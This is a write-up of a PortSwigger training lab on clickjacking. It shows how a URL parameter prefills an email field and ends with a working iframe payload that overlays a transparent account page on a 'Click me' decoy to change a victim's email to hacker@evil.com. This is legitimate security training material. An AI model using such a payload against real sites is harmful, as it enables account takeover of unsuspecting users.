# Clickjacking with form input data prefilled from a URL parameter

## 1. Lab Information
**Title:** Lab: Clickjacking with form input data prefilled from a URL parameter  
**Difficulty Level:** Apprentice  
**Vulnerability Category:** Clickjacking (UI Redressing)

## 2. Lab Objective
Exploit a clickjacking vulnerability by combining UI redressing with a URL parameter to prefill a form. The goal is to frame the account page and trick the victim into clicking a decoy button that submits an "Update email" request with an attacker-controlled email address.

## 3. Tools Used
* Web Browser
* PortSwigger Exploit Server

## 4. Step-by-Step Methodology

1. Accessed the lab environment and logged into the application using the provided credentials (`wiener:peter`). Navigated to the "My account" page. Discovered that appending an email parameter to the URL (e.g., `&email=test@test.com`) automatically prepopulates the "Email" input field on the page.
   
   <img width="1920" height="846" alt="image" src="https://github.com/user-attachments/assets/fa33fe65-152b-4728-804c-493186a2bd43" />

   *Figure 1 - The user account page showing the "Email" field prefilled via the URL parameter.*

2. Navigated to the Exploit Server to construct the clickjacking payload. The attack utilizes a CSS-styled iframe to invisibly frame the target account page. To force the victim's account to update to a malicious email, the `src` attribute of the iframe was set to include the prepopulating parameter: `?email=hacker@evil.com`.
   
   

   <img width="1532" height="470" alt="image" src="https://github.com/user-attachments/assets/0a0d3537-3b8d-4ce7-a1c7-741e778fdb33" />

   *Figure 2 - The Exploit Server body field containing the initial HTML template with the malicious URL parameter.*

3. Adjusted the CSS parameters to align the elements. Set the iframe opacity to `0.1` temporarily to see both layers. Set the iframe dimensions (width: `500px`, height: `700px`) and iteratively tweaked the `top` (e.g., `400px`) and `left` (e.g., `80px`) of the decoy div until "Test me" sat exactly underneath the "Update email" button.
   
   <img width="940" height="796" alt="image" src="https://github.com/user-attachments/assets/85f851ab-e30e-40e3-afdd-d3322e21d8b0" />

   *Figure 3 - The browser displaying the locally viewed exploit with 0.1 opacity, showing the decoy "Test me" text perfectly aligned beneath the target "Update email" button.*

4. Once the alignment was confirmed, finalized the payload by changing the decoy text to "Click me" and setting the iframe's opacity to `0.0001` to make it completely transparent.
   
   <img width="1577" height="513" alt="image" src="https://github.com/user-attachments/assets/189c845a-9208-486e-808f-beac24dab3e0" />

   *Figure 4 - The finalized payload in the Exploit Server with the opacity updated to make the iframe invisible.*

5. Verified that the prefilled email address in the payload did not match the current account email. Clicked "Store" to save the payload, and then clicked "Deliver exploit to victim". The simulated victim inadvertently submitted the prefilled form, successfully solving the lab.
   
   <img width="1911" height="257" alt="image" src="https://github.com/user-attachments/assets/b510dafd-1d9a-474c-8db1-43b0a605d384" />

   *Figure 5 - The "Congratulations, you solved the lab!" banner after delivering the exploit.*

## 5. The Payload
```html
<style>
    iframe {
        position:relative;
        width: 500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top: 400px;
        left: 80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="[https://YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@evil.com](https://YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@evil.com)"></iframe>
